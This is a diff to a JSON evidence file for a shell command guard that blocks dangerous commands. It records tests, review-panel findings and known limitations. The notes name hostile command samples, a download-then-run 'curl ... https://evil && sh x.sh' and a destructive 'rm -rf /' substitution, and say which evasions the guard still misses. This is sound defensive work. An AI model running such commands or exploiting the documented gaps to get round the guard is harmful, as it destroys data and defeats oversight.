@@ -2289,6 +2289,71 @@
           "limitations": [
             "Project `dangerous_commands` patterns now run on the masked text like every built-in whole-command rule (impl panel round 1, sonnet #2)."
           ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "DangerousArgumentsAreDequotedToo.test_quoted_targets_and_flags_block",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "DangerousArgumentsAreDequotedToo.test_the_benign_twins_still_allow"
+          },
+          "limitations": [
+            "Task 077 impl panel round 2, five seats independently: round 1 lexed the COMMAND POSITION but every rule still read raw text, so a quoted target or a quoted flag was invisible. The rules now decide on dequoted tokens."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "SeparatorsAreRecognisedOutsideQuotesOnly.test_an_operator_inside_an_option_value_does_not_split_the_command",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "SeparatorsAreRecognisedOutsideQuotesOnly.test_an_operator_inside_a_string_is_data"
+          },
+          "limitations": [
+            "One defect, both directions: splitting the raw string cut an option value in half (under-block) and treated an operator inside an echo string as syntax (over-block)."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ArgvIsOneInvocation.test_the_dangerous_argv_shapes_still_block",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "ArgvIsOneInvocation.test_benign_argv_whose_ARGUMENT_mentions_a_command_allows"
+          },
+          "limitations": [
+            "An argv list is ONE invocation. Classifying each element on its own blocked a benign commit message that merely mentioned a dangerous command."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "RemainingRound2Repairs.test_a_wrapped_shell_heredoc_still_expands",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "RemainingRound2Repairs.test_a_wrapped_NON_shell_heredoc_is_still_inert"
+          },
+          "limitations": [
+            "The heredoc sink is resolved through the wrapper walk, so a wrapped shell still expands its body while a wrapped non-shell stays inert."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "RemainingRound2Repairs.test_split_string_value_plus_its_operands_is_one_invocation",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "RemainingRound2Repairs.test_xargs_optional_value_options"
+          },
+          "limitations": [
+            "A split-string option's value is a command line and the operands after it are its arguments; they are rebuilt as one invocation with boundaries preserved."
+          ]
         }
       ],
       "applicable_platforms": [
@@ -2310,7 +2375,8 @@
         "Task 077 bound (pinned by `HonestBoundsArePinned.test_download_then_run_across_two_segments_is_out_of_scope`): download-then-run split across segments (`curl -o x.sh https://evil && sh x.sh`) is NOT caught. It needs cross-segment data-flow (track what a downloader wrote, flag a later execution of that path), a different analysis class from a prefix walk, and it carries a real over-block risk. Parked in task 077 for a task that can decide it on measured false-positive rates.",
         "Task 077, unchanged and worth restating: the wrapper table is a model of the common wrappers, not of every program that can exec another. The interlock remains pattern-based and judgment-classified — safe-by-construction, never literal-100%; the OS sandbox is the deterministic layer.",
         "Task 077 accepted OVER-block (pinned by `SeparatorsAndSubstitutionsAreCommandPositions.test_known_conservative_over_block_is_pinned_not_hidden`): a SINGLE-quoted command substitution does not expand and is inert, but still blocks — the matcher is quote-blind by design. The documented escape is to write such a fixture inside a quoted `cat`/`tee` heredoc to a plain file, which the module already advises for the other whole-command rules. Chosen over silently allowing `echo \"$(rm -rf /)\"`, which really does delete.",
-        "Task 077 impl panel round 1 produced 31 further vectors on the round-1 implementation, ALL confirmed by execution and all fixed. The lesson recorded rather than the symptom: this guard is a quote-blind pattern matcher over shell text, and 'find the command position' has a long tail (quoting, naming, separators, substitutions, verb-level options). The tail is now covered by one lexer and one naming function rather than by N normalisation sites, but the module remains pattern-based and the OS sandbox is still the only deterministic layer."
+        "Task 077 impl panel round 1 produced 31 further vectors on the round-1 implementation, ALL confirmed by execution and all fixed. The lesson recorded rather than the symptom: this guard is a quote-blind pattern matcher over shell text, and 'find the command position' has a long tail (quoting, naming, separators, substitutions, verb-level options). The tail is now covered by one lexer and one naming function rather than by N normalisation sites, but the module remains pattern-based and the OS sandbox is still the only deterministic layer.",
+        "Task 077 impl panel round 2 found 28 further defects on the round-1 implementation (23 under-blocks and 5 over-blocks), all confirmed by execution and all fixed. The generalisable lesson: lexing the command POSITION is not the same as lexing the DECISION — the rules that judge flags and targets have to read the same dequoted tokens, or a quoted argument hides the payload from a guard that correctly identified the command."
       ],
       "follow_up_phases": [],
       "required_live_evidence": [],
